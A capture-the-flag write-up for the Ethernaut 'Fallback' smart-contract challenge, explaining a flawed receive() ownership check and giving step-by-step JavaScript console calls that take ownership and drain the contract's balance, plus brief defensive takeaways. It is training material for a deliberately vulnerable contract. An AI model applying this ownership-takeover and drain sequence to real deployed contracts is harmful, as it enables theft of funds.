
---

## Level 1: Fallback

 # Ethernaut Level 1: Fallback

## Challenge
Claim ownership of the contract and reduce its balance to 0.

[Level 1](https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB)

## Vulnerability: Improper Access Control in receive()

The `receive()` function sets ownership when raw ETH is sent to the contract, requiring only that the sender has contributed > 0 through `contribute()`. No minimum amount check on the ETH sent to `receive()`.

## Solution

```js
// Step 1: Become a contributor (send less than 0.001 ETH)
await contract.contribute({value: toWei("0.0001")})

// Step 2: Trigger receive() by sending ETH directly
await sendTransaction({
  from: player,
  to: contract.address,
  value: toWei("0.0001"),
  gas: 100000
})

// Step 3: Verify ownership
await contract.owner()

// Step 4: Drain the contract
await contract.withdraw()

// Step 5: Verify balance is zero
await getBalance(contract.address)

// Step 6: Submit Instance from the UI
```
Key Takeaways

   - receive() triggers on raw ETH transfer with empty calldata
   - Always validate caller identity AND state in fallback functions
   - sendTransaction requires manual gas override on Sepolia: use gas: 100000
   - MetaMask auto-estimates 21M gas which exceeds Sepolia RPC cap of 16.7M
